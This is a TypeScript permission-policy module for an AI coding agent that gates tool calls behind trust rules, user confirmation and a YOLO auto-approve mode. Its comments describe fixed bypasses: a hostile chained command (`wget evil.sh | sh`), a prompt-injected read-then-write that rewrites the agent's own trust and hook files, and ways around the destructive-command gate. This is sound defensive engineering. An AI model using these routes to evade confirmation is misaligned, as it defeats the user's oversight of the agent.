import * as fs from 'node:fs/promises';
import * as path from 'node:path';
import type { Context } from '../core/context.js';
import type { InputReader } from '../types/input-reader.js';
import type {
  PermissionDecision,
  PermissionPolicy,
  PermissionTrace,
  PermissionTraceStep,
  TrustPolicy,
} from '../types/permission.js';
import type { Tool } from '../types/tool.js';
import { atomicWrite } from '../utils/atomic-write.js';
import { matchGlob } from '../utils/glob-match.js';
import { LruCache } from '../utils/lru-cache.js';
import { safeParse } from '../utils/safe-json.js';
import { subjectForToolInput } from '../utils/tool-subject.js';
import { hasCapability, ToolCapabilities } from './capabilities.js';
import { type TrustPolicyDiagnostic, validateTrustPolicy } from './permission-policy-schema.js';
import { getInputString, isClearlyDestructiveBashCommand } from './yolo-risk.js';

// ── Re-exports from extracted modules ────────────────────────────────────
export { AutoApprovePermissionPolicy } from './auto-approve-policy.js';
export {
  alwaysAllowUnavailableReason,
  matchesTrust,
  matchesCommandTrust,
  hasShellSubject,
  permissionFingerprint,
  shellCommandLineFromInput,
  inputPathLooksSensitive,
  shellCommandReadsSensitivePath,
} from './permission-helpers.js';

// ── Internal imports from extracted modules ──────────────────────────────
import {
  matchesTrust,
  matchesCommandTrust,
  hasShellSubject,
  alwaysAllowUnavailableReason,
  permissionFingerprint,
  shellCommandLineFromInput,
  inputPathLooksSensitive,
  shellCommandReadsSensitivePath,
  isInsideAgentStateRoot,
} from './permission-helpers.js';


/**
 * Path strings an FS_WRITE tool's input may write to. The tools disagree on
 * the key — write/edit use `path`, replace/format/git use `files` (string or
 * array), patch uses `directory`, design uses `out`, scaffold writes under
 * `cwd`/`template` — so callers that need "every path this call can touch"
 * (e.g. the YOLO state-root carve-out) must inspect all of them.
 */
function fsWriteTargetPaths(input: unknown): string[] {
  const out: string[] = [];
  if (!input || typeof input !== 'object') return out;
  const obj = input as Record<string, unknown>;
  for (const key of [
    'path',
    'file_path',
    'file',
    'filePath',
    'files',
    'target',
    'targetPath',
    'out',
    'directory',
    'cwd',
    'template',
  ]) {
    const value = obj[key];
    if (typeof value === 'string') {
      if (value.length > 0) out.push(value);
    } else if (Array.isArray(value)) {
      for (const item of value) {
        if (typeof item === 'string' && item.length > 0) out.push(item);
      }
    }
  }
  return out;
}

export interface PermissionPolicyOptions {
  trustFile: string;
  yolo?: boolean | undefined;
  /**
   * Let YOLO auto-approve destructive shell commands too. Off by default: with
   * YOLO on, `rm -rf`, git history rewrites and external publishes still ask
   * (WS-008).
   */
  yoloDestructive?: boolean | undefined;
  promptDelegate?: (
    tool: Tool,
    input: unknown,
    suggestedPattern: string,
  ) => Promise<'yes' | 'no' | 'always' | 'deny'>;
  inputReader?: InputReader | undefined;
}

export class DefaultPermissionPolicy implements PermissionPolicy {
  private policy: TrustPolicy = {};
  private loaded = false;
  private readonly trustFile: string;
  private yolo: boolean;
  /**
   * Session-scoped "soft deny" map. When the user presses 'n' (block once),
   * the tool+pattern is added here. If the LLM retries in the same session,
   * we return deny directly without asking again.
   *
   * Cleared on reload() since reload = fresh trust file snapshot.
   */
  private sessionDenied = new Map<string, boolean>();
  /**
   * Session-scoped one-shot "soft trust" map. When the user presses 'y', the
   * tool+pattern is added here so the immediate confirm re-run can proceed.
   * The entry is consumed on first use; future calls must ask again unless the
   * user chose persistent trust.
   *
   * Cleared on reload().
   */
  private sessionAllowed = new Map<string, boolean>();
  /**
   * Interactive prompt delegate. When set, `evaluate()` calls it to get a
   * user decision synchronously (CLI REPL path). When cleared (TUI / WebUI),
   * `evaluate()` returns `confirm` so the caller can emit
   * `tool.confirm_needed` for the UI layer to handle.
   *
   * Mutable so the host can switch from CLI-prompt to event-driven
   * confirmation at runtime (e.g. when `--goal` forces TUI mode after
   * the agent was already constructed).
   */
  private promptDelegate?: PermissionPolicyOptions['promptDelegate'] | undefined;
  /** Pre-compiled wildcard patterns — rebuilt on reload for O(1) lookup. */
  private wildcardEntries: { pattern: string; value: TrustPolicy[string] }[] = [];
  /**
   * Evaluate-result cache. Keyed by `tool.name::subject::permissionFingerprint`
   * so repeated calls with the same tool+input skip namespace matching,
   * subject computation, and pattern matching (matchAny). The fingerprint
   * suffix covers the `Tool` fields `evaluate()` reads (`permission`,
   * `riskTier`, `mutating`, `capabilities`), so a tool redefined via
   * `ToolRegistry.wrap()` misses the cache instead of inheriting a stale
   * verdict.
   *
   * Cleared on any state change (reload, trust, deny, yolo toggle) because
   * the result depends on the full policy state. The write-tool smart-bypass
   * (step 7 in `evaluate()`) is not cached since `ctx.hasRead()` changes
   * dynamically within a session.
   *
   * P3 #17 (before-release.md): capped at 500 entries via LRU eviction. An
   * iteration that evaluates thousands of unique tool+subject combinations
   * (e.g. repeated `tool-help` or `bash` with different commands) can grow
   * the cache without bound. 500 is far more than any single iteration needs;
   * the LRU evicts the least-recently-used entries first.
   */
  private _evalCache = new LruCache<string, PermissionDecision>(500);
  private policyDiagnostics: TrustPolicyDiagnostic[] = [];
  private policyInvalid = false;

  /**
   * When true, YOLO also auto-approves clearly destructive shell commands.
   *
   * WS-008: `isClearlyDestructiveBashCommand` was exported and heavily tested
   * but called from zero production modules, so YOLO returned `auto` for
   * everything — including `rm -rf`, git history rewrites, and external
   * publishes. The `'yolo_destructive'` decision source, the getter/setter on
   * PermissionPolicy, and the TUI branch that reads it all existed; only the
   * gate itself was missing. Defaults to false: destructive commands still ask,
   * even in YOLO.
   */
  private yoloDestructive: boolean;

  constructor(opts: PermissionPolicyOptions) {
    this.trustFile = opts.trustFile;
    this.yolo = opts.yolo ?? false;
    this.yoloDestructive = opts.yoloDestructive ?? false;
    this.promptDelegate = opts.promptDelegate;
  }

  /** Allow YOLO to cover destructive shell commands too (off by default). */
  setYoloDestructive(enabled: boolean): void {
    if (this.yoloDestructive !== enabled) this._evalCache.clear();
    this.yoloDestructive = enabled;
  }

  /** Whether YOLO currently extends to destructive shell commands. */
  getYoloDestructive(): boolean {
    return this.yoloDestructive;
  }

  /**
   * True when this call is an FS_WRITE whose target lands inside WrongStack's
   * own state root.
   *
   * FS_WRITE tools disagree on where the target path lives: write/edit use
   * `path`, replace/format/git `files` (string OR array), patch `directory`,
   * design `out`, scaffold writes under `cwd`/`template`. Checking only
   * `path`/`file_path` let a state-root write merely switch tools, so every
   * path-bearing key is inspected.
   *
   * Shared by the YOLO carve-out and the eval-cache guard so the two cannot
   * drift: the carve-out scans all path keys while the cache key fingerprints
   * only the subject key, so the cache must consult the same predicate or a
   * secondary state-root key can be replayed a cached `auto`.
   */
  private hasAgentStateWriteTarget(tool: Tool, input: unknown, ctx: Context): boolean {
    if (!hasCapability(tool, ToolCapabilities.FS_WRITE)) return false;
    for (const targetPath of fsWriteTargetPaths(input)) {
      // `cwd`/`workingDir` are absent on the minimal contexts some callers
      // build, and `path.resolve(undefined, …)` throws — a throw here would
      // take down every permission evaluation, so fall back rather than
      // assume the field is populated.
      const base = ctx.workingDir ?? ctx.cwd;
      const resolved = base ? path.resolve(base, targetPath) : path.resolve(targetPath);
      if (isInsideAgentStateRoot(resolved)) return true;
    }
    return false;
  }

  /**
   * True when YOLO is on but this specific call is a destructive shell command
   * the user has not opted to auto-approve. Shared by `evaluate()` and the
   * explain/trace path so the two cannot drift.
   */
  private yoloBlockedAsDestructive(tool: Tool, input: unknown, ctx: Context): boolean {
    if (!this.yolo || this.yoloDestructive) return false;

    // A write into WrongStack's own state is destructive regardless of which
    // tool performs it. Classifying only shell surfaces let YOLO auto-approve
    // the one write that grants persistent execution — `hooks` in the trusted
    // config layer, or an allow-glob in `trust.json` — so "destructive actions
    // still ask" was bypassable by never issuing a shell command at all.
    if (this.hasAgentStateWriteTarget(tool, input, ctx)) return true;

    // `bash` and `exec` are the shell surfaces; a tool that declares
    // shell.arbitrary reaches the same place under another name.
    const isShellSurface =
      tool.name === 'bash' ||
      tool.name === 'exec' ||
      (tool.capabilities ?? []).includes('shell.arbitrary');
    if (!isShellSurface) return false;
    const command = getInputString(input, 'command') ?? shellCommandLineFromInput(input);
    if (!command) return false;
    // projectRoot comes from the call context, so `rm -rf .wrongstack/tmp`
    // inside the project stays auto-approved while a sibling- or
    // system-directory wipe does not.
    return isClearlyDestructiveBashCommand(command, ctx.projectRoot);
  }

  /**
   * Replace (or clear) the interactive prompt delegate at runtime.
   * Used by the CLI to switch from inline prompts (REPL) to event-driven
   * confirmation (TUI) when the run mode is determined after the policy
   * was constructed (e.g. `--goal` auto-flipping to TUI).
   */
  setPromptDelegate(delegate: PermissionPolicyOptions['promptDelegate']): void {
    this.promptDelegate = delegate;
  }

  /** Toggle YOLO (auto-approve) mode at runtime. */
  setYolo(enabled: boolean): void {
    if (this.yolo !== enabled) this._evalCache.clear();
    this.yolo = enabled;
  }

  /** Check whether YOLO mode is currently active. */
  getYolo(): boolean {
    return this.yolo;
  }

  /** Read-only diagnostics for policy inspector/editor surfaces. */
  getPolicyDiagnostics(): readonly TrustPolicyDiagnostic[] {
    return this.policyDiagnostics.map((diagnostic) => ({ ...diagnostic }));
  }

  async reload(): Promise<void> {
    this.policyDiagnostics = [];
    this.policyInvalid = false;
    try {
      const raw = await fs.readFile(this.trustFile, 'utf8');
      const parsed = safeParse<unknown>(raw);
      if (!parsed.ok) {
        this.policy = {};
        this.policyInvalid = true;
        this.policyDiagnostics = [
          {
            severity: 'error',
            code: 'invalid_json',
            path: '$',
            message: parsed.error ?? 'trust policy is not valid JSON',
          },
        ];
      } else {
        const validation = validateTrustPolicy(parsed.value);
        this.policyDiagnostics = validation.diagnostics;
        if (validation.ok) {
          this.policy = validation.policy;
        } else {
          this.policy = {};
          this.policyInvalid = true;
        }
      }
    } catch (err) {
      this.policy = {};
      if ((err as NodeJS.ErrnoException).code !== 'ENOENT') {
        this.policyInvalid = true;
        this.policyDiagnostics = [
          {
            severity: 'error',
            code: 'read_error',
            path: '$',
            message: err instanceof Error ? err.message : String(err),
          },
        ];
      }
    }
    // Pre-compile wildcard entries so findNamespaceEntry is O(k) instead of O(n*m)
    this.wildcardEntries = [];
    for (const [key, val] of Object.entries(this.policy)) {
      if (key.includes('*')) this.wildcardEntries.push({ pattern: key, value: val });
    }
    // Clear session-scoped soft deny/allow — reload = fresh trust file snapshot
    this.sessionDenied.clear();
    this.sessionAllowed.clear();
    this._evalCache.clear();
    this.loaded = true;
  }

  private _logDeny(tool: string, subject: string | undefined, reason: string): void {
    console.warn(
      JSON.stringify({
        level: 'warn',
        event: 'permission.denied',
        message: `Permission denied: ${tool}${subject ? ` (subject: ${subject})` : ''} — ${reason}`,
        tool,
        subject,
        reason,
        timestamp: new Date().toISOString(),
      }),
    );
  }

  async evaluate(tool: Tool, input: unknown, ctx: Context): Promise<PermissionDecision> {
    if (!this.loaded) await this.reload();

    if (this.policyInvalid) {
      this._logDeny(tool.name, undefined, 'trust policy is invalid');
      return {
        permission: 'deny',
        source: 'deny',
        reason: 'trust policy is invalid; refusing tool execution until it is repaired',
      };
    }

    // 1. Tool-namespace matching (mcp__server__* etc.)
    const namespaceEntry = this.findNamespaceEntry(tool.name);

    // 2. Tool-name entry
    const entry = this.policy[tool.name] ?? namespaceEntry;

    // 3. Compute subject (the thing being matched)
    const subject = subjectForToolInput(tool.name, input, tool.subjectKey);
    // Session deny/allow are keyed by tool+pattern, because `denyOnce` /
    // `allowOnce` are called from the UI with only those two. This key must
    // keep that exact shape — widening it would silently stop session denies
    // from matching, which fails OPEN.
    const cacheKey = `${tool.name}::${subject ?? tool.name}`;

    // S1. Cache check — skip namespace/subject/pattern re-evaluation when the
    //     same tool+subject was already decided. The write-tool smart bypass
    //     (step 7) is NOT cached because `ctx.hasRead()` changes dynamically
    //     within a session — we let it fall through below.
    //
    // WS-058: this short-circuits BEFORE the tool-default-deny check, so a
    // cached decision outlives the tool definition it was computed from.
    // `registry.wrap()` replaces a tool in place and is reachable from the
    // plugin API, so a tool tightened to `permission: 'deny'` mid-session
    // would keep being served the earlier `auto`. The eval cache therefore
    // gets its OWN key that fingerprints the permission-relevant fields; a
    // changed tool definition simply misses the cache instead of inheriting a
    // stale verdict.
    const evalKey = `${cacheKey}::${permissionFingerprint(tool)}`;
    // The YOLO carve-out (step 7) inspects EVERY path-bearing key via
    // `fsWriteTargetPaths`, but `cacheKey` fingerprints only the single
    // subject key. Two calls can therefore share a cache key while differing
    // in a secondary path key: `{files:'src/app.ts'}` caches `auto`, and a
    // replay of `{files:'src/app.ts', out:'<state-root>/trust.json'}` would be
    // served that cached `auto` before `yoloBlockedAsDestructive` ever runs.
    // Serving the cache is only safe when no target path escapes into the
    // agent state root, so re-check that here rather than widening the key
    // (`cacheKey` shape is load-bearing for denyOnce/allowOnce and fails OPEN).
    if (tool.name !== 'write' && !this.hasAgentStateWriteTarget(tool, input, ctx)) {
      const cached = this._evalCache.get(evalKey);
      if (cached !== undefined) return cached;
    }

    // 3a. Session soft deny — 'n' blocks this tool+pattern for the rest of
    //     this session without writing to the trust file. Prevents LLM retry
    //     from re-triggering the confirm prompt.
    if (this.sessionDenied.has(cacheKey)) {
      this._logDeny(tool.name, subject, 'session soft deny (user pressed no)');
      const decision: PermissionDecision = {
        permission: 'deny',
        source: 'deny',
        reason: 'session soft deny (user pressed no)',
      };
      this._evalCache.set(evalKey, decision);
      return decision;
    }

    // 3b. Session soft allow — 'y' auto-approves this tool+pattern once
    //     without writing to the trust file. Do not cache this decision; it is
    //     consumed immediately so repeated destructive calls still ask.
    if (this.sessionAllowed.has(cacheKey)) {
      this.sessionAllowed.delete(cacheKey);
      const decision: PermissionDecision = {
        permission: 'auto',
        source: 'trust',
        reason: 'session one-shot allow (user pressed yes)',
      };
      return decision;
    }

    // 4. Deny — absolute
    if (entry?.deny && subject && matchesTrust(entry.deny, subject)) {
      this._logDeny(tool.name, subject, 'matched deny pattern');
      const decision: PermissionDecision = {
        permission: 'deny',
        source: 'deny',
        reason: 'matched deny pattern',
      };
      this._evalCache.set(evalKey, decision);
      return decision;
    }
    if (tool.permission === 'deny') {
      this._logDeny(tool.name, subject, 'tool default deny');
      const decision: PermissionDecision = {
        permission: 'deny',
        source: 'default',
        reason: 'tool default deny',
      };
      this._evalCache.set(evalKey, decision);
      return decision;
    }

    // 6. Allow (trust file)
    // WS-047: shell subjects use the separator-aware matcher, so `git *` does
    // not authorize `git status; wget evil.sh | sh`. The deny check above
    // deliberately keeps the permissive matcher — see `matchesCommandTrust`.
    const allowMatches = hasShellSubject(tool) ? matchesCommandTrust : matchesTrust;
    if (entry?.allow && subject && allowMatches(entry.allow, subject)) {
      const decision: PermissionDecision = {
        permission: 'auto',
        source: 'trust',
        reason: 'matched allow pattern',
      };
      this._evalCache.set(evalKey, decision);
      return decision;
    }
    if (entry?.auto) {
      const decision: PermissionDecision = { permission: 'auto', source: 'trust' };
      this._evalCache.set(evalKey, decision);
      return decision;
    }

    // 6a. Sensitive reads — outside YOLO, reading credentials needs explicit
    // approval unless the user already trusted this exact subject above. In
    // YOLO, only truly destructive operations prompt; secret redaction remains
    // the safety net for read output.
    if (!this.yolo && this.isSensitiveReadCall(tool, input)) {
      if (this.promptDelegate) {
        const userDecision = await this.promptDelegate(tool, input, subject ?? tool.name);
        if (userDecision === 'always') {
          // WS-046: with no subject there is nothing to remember. Approve this
          // call and say why it was not persisted, rather than writing a rule
          // that can never match.
          if (subject === undefined) {
            return {
              permission: 'auto',
              source: 'user',
              reason: `approved once — ${alwaysAllowUnavailableReason(tool, input)}`,
            };
          }
          await this.trust({ tool: tool.name, pattern: subject });
          return {
            permission: 'auto',
            source: 'user',
            reason: 'user always-allowed sensitive read',
          };
        }
        if (userDecision === 'deny') {
          await this.deny({ tool: tool.name, pattern: subject ?? tool.name });
          this._logDeny(tool.name, subject, 'user denied sensitive read');
          return { permission: 'deny', source: 'user', reason: 'user denied sensitive read' };
        }
        return {
          permission: userDecision === 'yes' ? 'auto' : 'deny',
          source: 'user',
          reason: 'sensitive read user decision',
        };
      }
      return {
        permission: 'confirm',
        source: 'default',
        riskTier: 'standard',
        reason: 'sensitive file read needs explicit approval',
      };
    }

    // 7. YOLO — auto-approve every non-denied call, except a clearly
    //    destructive shell command, which still asks (WS-008).
    if (this.yolo) {
      if (this.yoloBlockedAsDestructive(tool, input, ctx)) {
        // Deliberately not cached: the decision depends on this command string,
        // and the cache key is tool+subject, which for exec collapses to the
        // tool name.
        return {
          permission: 'confirm',
          source: 'yolo_destructive',
          riskTier: 'destructive',
          reason: 'destructive command needs explicit approval even in YOLO mode',
        };
      }
      const decision: PermissionDecision = { permission: 'auto', source: 'yolo' };
      this._evalCache.set(evalKey, decision);
      return decision;
    }

    // 7. Smart bypass: write tool — if the file was already read in this
    // session, the model has surfaced the content. No confirm needed.
    // NOTE: deliberately NOT cached because ctx.hasRead() changes dynamically.
    //
    // The bypass does NOT extend to the wstack global root. `readFiles` means
    // "the read tool touched this", not "the user approved it" — `read` is
    // `permission: 'auto'`, so a prompt-injected `read` followed by a `write`
    // would otherwise rewrite WrongStack's own trusted state with no prompt at
    // all. That state is executable: `config.local.json` merges as a fully
    // trusted layer whose `hooks` run at next boot, `trust.json` can disable
    // every future prompt, and `skills/`/`instructions/` re-enter the prompt.
    // Project content keeps the bypass; the agent's own state always confirms.
    if (tool.name === 'write' && subject) {
      if (ctx.hasRead(subject) && !isInsideAgentStateRoot(subject)) {
        return {
          permission: 'auto',
          source: 'context',
          reason: 'file already read in this session',
        };
      }
    }

    // 8. Tool default — but mutating tools need confirmation even with
    // auto-permission (e.g. shellcheck makes network calls; a remote WebSocket
    // client must not be able to trigger them without the user seeing the
    // tool.confirm_needed prompt). Non-mutating auto tools (read-only
    // heuristics, schema checks) are still safe to shortcut.
    //
    // Capability-based check: tools with fs.read or net.outbound (non-mutating)
    // can auto-approve; tools with fs.write, shell.*, etc. need confirmation.
    const hasWriteCap = hasCapability(tool, ToolCapabilities.FS_WRITE);
    const hasShellCap = hasCapability(tool, [
      ToolCapabilities.SHELL_ARBITRARY,
      ToolCapabilities.SHELL_RESTRICTED,
      ToolCapabilities.SHELL_EXEC,
    ]);
    const hasInstallCap = hasCapability(tool, ToolCapabilities.PACKAGE_INSTALL);
    const hasConfigCap = hasCapability(tool, ToolCapabilities.CONFIG_MUTATE);
    const hasSubagentCap = hasCapability(tool, ToolCapabilities.SUBAGENT_SPAWN);
    const isMutating =
      tool.mutating ||
      hasWriteCap ||
      hasShellCap ||
      hasInstallCap ||
      hasConfigCap ||
      hasSubagentCap;
    if (tool.permission === 'auto' && !isMutating) {
      const decision: PermissionDecision = { permission: 'auto', source: 'default' };
      this._evalCache.set(evalKey, decision);
      return decision;
    }

    // 9. Confirm — delegate to prompt
    if (this.promptDelegate) {
      const decision = await this.promptDelegate(tool, input, subject ?? tool.name);
      if (decision === 'always') {
        // WS-046: see `alwaysAllowUnavailableReason`. Storing `pattern:
        // tool.name` here is what made "always allow" a permanent silent
        // no-op for every subject-less tool.
        if (subject === undefined) {
          return {
            permission: 'auto',
            source: 'user',
            reason: `approved once — ${alwaysAllowUnavailableReason(tool, input)}`,
          };
        }
        await this.trust({ tool: tool.name, pattern: subject });
        return { permission: 'auto', source: 'user', reason: 'user always-allowed' };
      }
      if (decision === 'deny') {
        await this.deny({ tool: tool.name, pattern: subject ?? tool.name });
        this._logDeny(tool.name, subject, 'user denied');
        return { permission: 'deny', source: 'user', reason: 'user denied' };
      }
      return { permission: decision === 'yes' ? 'auto' : 'deny', source: 'user' };
    }
    return { permission: 'confirm', source: 'default' };
  }

  private isSensitiveReadCall(tool: Tool, input: unknown): boolean {
    const isReadTool =
      hasCapability(tool, ToolCapabilities.FS_READ) ||
      tool.name === 'read' ||
      tool.name === 'grep' ||
      tool.name === 'glob' ||
      tool.name === 'tree';
    if (isReadTool && inputPathLooksSensitive(input)) return true;

    const hasShellCap = hasCapability(tool, [
      ToolCapabilities.SHELL_ARBITRARY,
      ToolCapabilities.SHELL_RESTRICTED,
      ToolCapabilities.SHELL_EXEC,
    ]);
    if (!hasShellCap && tool.name !== 'bash' && tool.name !== 'shell' && tool.name !== 'exec') {
      return false;
    }
    const command = shellCommandLineFromInput(input);
    return command ? shellCommandReadsSensitivePath(command) : false;
  }

  async trust(rule: { tool: string; pattern: string }): Promise<void> {
    if (!this.loaded) await this.reload();
    if (this.policyInvalid) {
      throw new Error('Cannot update trust rules while trust.json is invalid; repair it first.');
    }
    const entry = this.policy[rule.tool] ?? {};
    entry.allow = Array.from(new Set([...(entry.allow ?? []), rule.pattern]));
    this.policy[rule.tool] = entry;
    this._evalCache.clear();
    try {
      await atomicWrite(this.trustFile, JSON.stringify(this.policy, null, 2));
    } catch (err) {
      // Revert in-memory state since disk write failed
      const existing = this.policy[rule.tool];
      if (existing?.allow) {
        const idx = existing.allow.indexOf(rule.pattern);
        if (idx !== -1) existing.allow.splice(idx, 1);
      }
      throw err;
    }
  }

  /** Persist a deny rule — this tool+pattern pair is permanently blocked. */
  async deny(rule: { tool: string; pattern: string }): Promise<void> {
    if (!this.loaded) await this.reload();
    if (this.policyInvalid) {
      throw new Error('Cannot update deny rules while trust.json is invalid; repair it first.');
    }
    const entry = this.policy[rule.tool] ?? {};
    entry.deny = Array.from(new Set([...(entry.deny ?? []), rule.pattern]));
    this.policy[rule.tool] = entry;
    this._evalCache.clear();
    try {
      await atomicWrite(this.trustFile, JSON.stringify(this.policy, null, 2));
    } catch (err) {
      // Revert in-memory state since disk write failed
      const existing = this.policy[rule.tool];
      if (existing?.deny) {
        const idx = existing.deny.indexOf(rule.pattern);
        if (idx !== -1) existing.deny.splice(idx, 1);
      }
      throw err;
    }
  }

  /** Block this tool+pattern for the rest of this session (no trust file). */
  denyOnce(rule: { tool: string; pattern: string }): void {
    this.sessionDenied.set(`${rule.tool}::${rule.pattern}`, true);
    this._evalCache.clear();
  }

  /** Auto-approve this tool+pattern once (no trust file). */
  allowOnce(rule: { tool: string; pattern: string }): void {
    this.sessionAllowed.set(`${rule.tool}::${rule.pattern}`, true);
    this._evalCache.clear();
  }

  /**
   * Side-effect-free permission evaluation trace. Mirrors `evaluate()`
   * step-by-step without prompting the user, writing to trust files, or
   * mutating session state. Returns the full ordered trace and winner.
   */
  async explain(tool: Tool, input: unknown, ctx: Context): Promise<PermissionTrace> {
    if (!this.loaded) await this.reload();

    const subject = subjectForToolInput(tool.name, input, tool.subjectKey);
    const steps: PermissionTraceStep[] = [];
    let winnerIndex = -1;

    const add = (
      rule: string,
      matched: boolean,
      decision: 'auto' | 'deny' | 'confirm',
      source: string,
      detail: string,
    ): void => {
      steps.push({ rule, matched, decision, source, detail });
    };

    // 1. Policy invalid
    if (this.policyInvalid) {
      add('policy invalid', true, 'deny', 'deny', 'trust policy is invalid; all tools are denied');
      winnerIndex = 0;
      return {
        toolName: tool.name,
        subject,
        steps,
        winnerIndex,
        decision: { permission: 'deny', source: 'deny', reason: 'trust policy is invalid' },
      };
    }
    add('policy valid', false, 'auto', 'default', 'trust policy loaded successfully');

    // Namespace entry resolution
    const namespaceEntry = this.findNamespaceEntry(tool.name);
    const entry = this.policy[tool.name] ?? namespaceEntry;
    const namespaceSource = namespaceEntry
      ? `wildcard entry matched (${Object.keys(this.policy).find((k) => k.includes('*') && matchGlob(k, tool.name))})`
      : 'no namespace match';

    // 2. Session soft deny
    const cacheKey = `${tool.name}::${subject ?? tool.name}`;
    if (this.sessionDenied.has(cacheKey)) {
      add(
        'session soft deny',
        true,
        'deny',
        'deny',
        'user pressed "no" earlier in this session — blocked until reload',
      );
      winnerIndex = steps.length - 1;
      return {
        toolName: tool.name,
        subject,
        steps,
        winnerIndex,
        decision: {
          permission: 'deny',
          source: 'deny',
          reason: 'session soft deny (user pressed no)',
        },
      };
    }
    add(
      'session soft deny',
      false,
      'deny',
      'deny',
      'no session-level soft deny for this tool+subject',
    );

    // 3. Session soft allow (one-shot)
    if (this.sessionAllowed.has(cacheKey)) {
      add(
        'session soft allow',
        true,
        'auto',
        'trust',
        'user pressed "yes" in current session — one-shot auto-approve (consumed)',
      );
      winnerIndex = steps.length - 1;
      return {
        toolName: tool.name,
        subject,
        steps,
        winnerIndex,
        decision: {
          permission: 'auto',
          source: 'trust',
          reason: 'session one-shot allow (user pressed yes)',
        },
      };
    }
    add(
      'session soft allow',
      false,
      'auto',
      'trust',
      'no session-level one-shot allow for this tool+subject',
    );

    // 4. Trust deny
    if (entry?.deny && subject && matchesTrust(entry.deny, subject)) {
      add(
        'trust deny',
        true,
        'deny',
        'deny',
        `subject "${subject}" matched a deny pattern in trust file`,
      );
      winnerIndex = steps.length - 1;
      return {
        toolName: tool.name,
        subject,
        steps,
        winnerIndex,
        decision: { permission: 'deny', source: 'deny', reason: 'matched deny pattern' },
      };
    }
    add(
      'trust deny',
      false,
      'deny',
      'deny',
      `no deny pattern matched (namespace: ${namespaceSource})`,
    );

    // 5. Tool default deny
    if (tool.permission === 'deny') {
      add(
        'tool default deny',
        true,
        'deny',
        'default',
        `tool "${tool.name}" has permission: deny by default`,
      );
      winnerIndex = steps.length - 1;
      return {
        toolName: tool.name,
        subject,
        steps,
        winnerIndex,
        decision: { permission: 'deny', source: 'default', reason: 'tool default deny' },
      };
    }
    add(
      'tool default deny',
      false,
      'deny',
      'default',
      `tool "${tool.name}" has permission: "${tool.permission}"`,
    );

    // 6. Trust allow
    if (entry?.allow && subject && matchesTrust(entry.allow, subject)) {
      add(
        'trust allow',
        true,
        'auto',
        'trust',
        `subject "${subject}" matched an allow pattern in trust file`,
      );
      winnerIndex = steps.length - 1;
      return {
        toolName: tool.name,
        subject,
        steps,
        winnerIndex,
        decision: { permission: 'auto', source: 'trust', reason: 'matched allow pattern' },
      };
    }
    add(
      'trust allow',
      false,
      'auto',
      'trust',
      `no allow pattern matched (namespace: ${namespaceSource})`,
    );

    // 7. Trust auto
    if (entry?.auto) {
      add('trust auto', true, 'auto', 'trust', `trust file has auto: true for "${tool.name}"`);
      winnerIndex = steps.length - 1;
      return {
        toolName: tool.name,
        subject,
        steps,
        winnerIndex,
        decision: { permission: 'auto', source: 'trust', reason: 'trust auto' },
      };
    }
    add('trust auto', false, 'auto', 'trust', `no auto flag for "${tool.name}" in trust file`);

    // 8. Sensitive read (only checked when not YOLO)
    if (!this.yolo && this.isSensitiveReadCall(tool, input)) {
      const hasDelegate = this.promptDelegate !== undefined;
      add(
        'sensitive read',
        true,
        hasDelegate ? 'confirm' : 'confirm',
        'default',
        hasDelegate
          ? 'sensitive file read detected — would prompt user for approval'
          : 'sensitive file read detected — returns confirm (no prompt delegate)',
      );
      winnerIndex = steps.length - 1;
      return {
        toolName: tool.name,
        subject,
        steps,
        winnerIndex,
        decision: {
          permission: 'confirm',
          source: 'default',
          riskTier: 'standard',
          reason: 'sensitive file read needs explicit approval',
        },
      };
    }
    add(
      'sensitive read',
      false,
      'confirm',
      'default',
      'not a sensitive read call (or YOLO bypasses this check)',
    );

    // 9. YOLO
    if (this.yolo) {
      if (this.yoloBlockedAsDestructive(tool, input, ctx)) {
        add(
          'yolo destructive gate',
          true,
          'confirm',
          'yolo_destructive',
          'YOLO is active but this is a clearly destructive command — still asking',
        );
        winnerIndex = steps.length - 1;
        return {
          toolName: tool.name,
          subject,
          steps,
          winnerIndex,
          decision: {
            permission: 'confirm',
            source: 'yolo_destructive',
            riskTier: 'destructive',
            reason: 'destructive command needs explicit approval even in YOLO mode',
          },
        };
      }
      add(
        'yolo',
        true,
        'auto',
        'yolo',
        'YOLO mode is active — auto-approving every non-denied call',
      );
      winnerIndex = steps.length - 1;
      return {
        toolName: tool.name,
        subject,
        steps,
        winnerIndex,
        decision: { permission: 'auto', source: 'yolo' },
      };
    }
    add('yolo', false, 'auto', 'yolo', 'YOLO mode is not active');

    // 10. Write-tool smart bypass
    if (tool.name === 'write' && subject) {
      const isAgentState = isInsideAgentStateRoot(subject);
      const hasRead = ctx.hasRead(subject) && !isAgentState;
      add(
        'write smart bypass',
        hasRead,
        'auto',
        'context',
        isAgentState
          ? `file "${subject}" is WrongStack's own state — bypass never applies, write always confirms`
          : hasRead
            ? `file "${subject}" was already read in this session — auto-approving write`
            : `file "${subject}" was not read in this session — bypass does not apply`,
      );
      if (hasRead) {
        winnerIndex = steps.length - 1;
        return {
          toolName: tool.name,
          subject,
          steps,
          winnerIndex,
          decision: {
            permission: 'auto',
            source: 'context',
            reason: 'file already read in this session',
          },
        };
      }
    } else {
      add(
        'write smart bypass',
        false,
        'auto',
        'context',
        'tool is not "write" or has no subject — bypass does not apply',
      );
    }

    // 11. Tool default auto + non-mutating
    const hasWriteCap = hasCapability(tool, ToolCapabilities.FS_WRITE);
    const hasShellCap = hasCapability(tool, [
      ToolCapabilities.SHELL_ARBITRARY,
      ToolCapabilities.SHELL_RESTRICTED,
      ToolCapabilities.SHELL_EXEC,
    ]);
    const hasInstallCap = hasCapability(tool, ToolCapabilities.PACKAGE_INSTALL);
    const hasConfigCap = hasCapability(tool, ToolCapabilities.CONFIG_MUTATE);
    const hasSubagentCap = hasCapability(tool, ToolCapabilities.SUBAGENT_SPAWN);
    const isMutating =
      tool.mutating ||
      hasWriteCap ||
      hasShellCap ||
      hasInstallCap ||
      hasConfigCap ||
      hasSubagentCap;
    if (tool.permission === 'auto' && !isMutating) {
      add(
        'safe default auto',
        true,
        'auto',
        'default',
        `tool "${tool.name}" has auto permission and is not mutating — safe to auto-approve`,
      );
      winnerIndex = steps.length - 1;
      return {
        toolName: tool.name,
        subject,
        steps,
        winnerIndex,
        decision: { permission: 'auto', source: 'default' },
      };
    }
    add(
      'mutating default confirm',
      true,
      'confirm',
      'default',
      isMutating
        ? `tool "${tool.name}" is mutating (default auto not enough) — needs confirmation`
        : `tool "${tool.name}" has "${tool.permission}" permission — needs confirmation`,
    );

    // 12. Final fallback — confirm
    winnerIndex = steps.length - 1;
